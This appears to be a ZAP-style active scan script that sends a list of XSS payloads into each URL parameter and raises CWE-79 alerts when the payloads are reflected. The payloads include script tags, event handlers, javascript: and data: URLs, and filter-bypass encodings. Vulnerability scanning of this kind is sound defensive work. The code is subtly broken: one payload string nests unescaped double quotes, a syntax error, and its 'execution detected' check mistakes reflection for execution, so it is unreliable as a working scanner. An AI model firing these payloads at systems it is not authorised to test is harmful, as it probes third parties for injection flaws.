
// Comprehensive XSS Detection Rule

function scanNode(as, msg) {
    var xssPayloads = [
        // Basic script injection
        "<script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        
        // Event handlers
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        
        // JavaScript URLs
        "javascript:alert('XSS')",
        "JaVaScRiPt:alert('XSS')",
        
        // Data URLs
        "data:text/html,<script>alert('XSS')</script>",
        
        // Filter bypass
        "<script src=data:,alert('XSS')></script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        
        // Context breaking
        "';alert('XSS');//",
        '";alert("XSS");//',
        "</textarea><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>",
        
        // CSS-based
        "<style>@import'javascript:alert("XSS")';</style>",
        
        // Advanced bypasses
        "<svg><animatetransform onbegin=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>"
    ];
    
    for (var i = 0; i < xssPayloads.length; i++) {
        var payload = xssPayloads[i];
        var testMsg = msg.cloneRequest();
        
        var params = testMsg.getUrlParams();
        for (var j = 0; j < params.size(); j++) {
            var param = params.get(j);
            var newMsg = testMsg.cloneRequest();
            newMsg.setGetParams(param.getName(), payload);
            
            as.sendAndReceive(newMsg, false, false);
            
            var response = newMsg.getResponseBody().toString();
            var lowerResponse = response.toLowerCase();
            
            var risk = 1;
            var confidence = 1;
            var evidence = "";
            
            // Check if payload is reflected
            if (response.indexOf(payload) > -1) {
                risk = 2;
                confidence = 3;
                evidence = "Exact payload reflection";
            } else if (lowerResponse.indexOf(payload.toLowerCase()) > -1) {
                risk = 2;
                confidence = 3;
                evidence = "Case-insensitive payload reflection";
            } else if (lowerResponse.indexOf("alert('xss')") > -1 || lowerResponse.indexOf('alert("xss")') > -1) {
                risk = 3;
                confidence = 3;
                evidence = "XSS execution detected in response";
            }
            
            // Check for script execution context
            if (evidence !== "" && (lowerResponse.indexOf("<script") > -1 || lowerResponse.indexOf("javascript:") > -1)) {
                risk = 3;
                confidence = 3;
                evidence += " (in script context)";
            }
            
            if (risk > 1) {
                as.raiseAlert(
                    risk,
                    confidence,
                    "Cross-Site Scripting (XSS) Vulnerability",
                    "Parameter: " + param.getName() + ", Payload: " + payload,
                    newMsg.getRequestHeader().getURI().toString(),
                    param.getName(),
                    payload,
                    evidence,
                    "Implement proper input validation and output encoding",
                    response.substring(0, 200),
                    79,  // CWE-79
                    8,   // WASC-8
                    newMsg
                );
            }
        }
    }
}
            